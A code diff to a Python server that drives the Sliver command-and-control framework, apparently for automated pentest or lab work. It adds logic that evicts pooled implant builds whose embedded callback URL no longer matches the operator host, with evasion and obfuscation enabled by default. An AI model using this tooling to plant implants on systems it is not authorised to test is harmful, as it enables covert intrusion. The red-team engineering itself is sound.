@@ -393,6 +393,7 @@ def build_server(manager: SliverManager):
         jitter: int = 30,
         evasion: bool = True,
         obfuscate: bool = True,
+        evict_stale: bool = True,
     ) -> dict:
         """Reuse an existing pool build or compile a fresh one.
 
@@ -400,6 +401,15 @@ def build_server(manager: SliverManager):
         protocol, OS, arch, and format all match. Matching builds are
         regenerated (takes seconds); unmatched profiles compile fresh and are
         named ``pool-<proto>-<osarch>`` for future reuse.
+
+        A pool HIT requires the build's *embedded* callback URL to match the
+        requested ``c2_host``/``c2_port`` — never just os/arch/format. A build
+        that matches the profile but carries a stale callback URL (e.g. a build
+        compiled against a previous VPN allocation) would be uploaded, executed,
+        and never check in. When ``evict_stale`` is set (the default), such a
+        stale same-profile build is deleted via ``remove_implant_build`` and a
+        fresh one is compiled, rather than silently reused. The evicted build
+        name is reported in ``evicted_stale``.
 
         This is the preferred first step for default-on C2 per box: call it
         before :func:`generate_beacon` so ~5 stable-LHOST builds can be kept
@@ -420,6 +430,7 @@ def build_server(manager: SliverManager):
         # search existing builds for (os, arch, format, C2 URL) match
         builds = await mgr.client.implant_builds() or {}
         matched_name: str | None = None
+        stale_name: str | None = None  # same profile, mismatched/unknown callback
         for build_name, build_cfg in builds.items():
             b_goos = getattr(build_cfg, "GOOS", "") or ""
             b_goarch = getattr(build_cfg, "GOARCH", "") or ""
@@ -436,12 +447,19 @@ def build_server(manager: SliverManager):
 
             if b_goos != os_n or b_goarch != arch_n or b_fmt != cfg.Format:
                 continue
-            for c2 in getattr(build_cfg, "C2", []):
-                if getattr(c2, "URL", "") == expected_url:
-                    matched_name = build_name
-                    break
-            if matched_name:
+
+            # Profile (os/arch/format) matches. A HIT additionally requires the
+            # build's embedded callback URL to match the requested c2_host:port —
+            # regenerating a build with a stale URL produces an implant that will
+            # never check in. Compare the embedded C2 URLs before declaring a hit.
+            build_urls = [getattr(c2, "URL", "") for c2 in getattr(build_cfg, "C2", [])]
+            if expected_url in build_urls:
+                matched_name = build_name
                 break
+            # Same profile but no matching callback URL: a stale pool slot. Record
+            # the first one so it can be evicted and rebuilt instead of lingering.
+            if stale_name is None:
+                stale_name = build_name
 
         if matched_name:
             gen = await mgr.client.regenerate_implant(matched_name)
@@ -460,17 +478,31 @@ def build_server(manager: SliverManager):
                 is_beacon=is_beacon,
             )
 
-        # no match — compile fresh
+        # no callback match — evict a stale same-profile build (if any) so its
+        # pool slot is reclaimed, then compile fresh against the current c2_host.
+        evicted_stale: str | None = None
+        if stale_name is not None and evict_stale:
+            try:
+                await mgr.client.delete_implant_build(stale_name)
+                evicted_stale = stale_name
+            except Exception:
+                # best-effort eviction; still compile fresh even if delete fails
+                evicted_stale = None
+
         gen = await mgr.generate_implant(cfg, name=pool_name)
         data = gen.File.Data
         fname = gen.File.Name or pool_name
         out_path = payload_dir() / fname
         out_path.write_bytes(data)
+        msg = "compiled fresh pool build"
+        if evicted_stale:
+            msg = "evicted stale pool build and compiled fresh"
         return ok(
-            "compiled fresh pool build",
+            msg,
             reused=False,
             name=fname,
             pool_name=pool_name,
+            evicted_stale=evicted_stale,
             saved_path=str(out_path),
             size=len(data),
             c2=expected_url,
